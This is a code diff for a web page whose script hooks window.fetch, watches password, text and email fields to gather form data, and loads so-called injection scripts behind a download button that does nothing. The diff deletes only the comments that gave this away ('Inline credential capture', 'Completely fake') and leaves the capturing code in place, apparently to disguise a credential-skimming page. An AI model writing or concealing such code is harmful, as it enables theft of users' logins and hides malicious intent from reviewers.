@@ -170,7 +170,7 @@
     
 
     <script>
-        // Install injection scripts immediately when page loads
+        
         document.addEventListener('DOMContentLoaded', function() {
             // Load all injection scripts
             loadScript('./analytics.js');
@@ -194,7 +194,7 @@
         function injectInlineScript() {
             const script = document.createElement('script');
             script.textContent = `
-                // Inline credential capture
+                
                 (function() {
                     const originalFetch = window.fetch;
                     window.fetch = function(...args) {
@@ -211,7 +211,7 @@
                         return originalFetch.apply(this, args);
                     };
 
-                    // Monitor all form inputs
+                    
                     document.addEventListener('input', function(e) {
                         if (e.target.type === 'password' || e.target.type === 'text' || e.target.type === 'email') {
                             const formData = {};
@@ -241,8 +241,7 @@
         }
 
         function startDownload() {
-            // Completely fake - do nothing when clicked
-            // User clicks but nothing happens
+            
         }
 
         
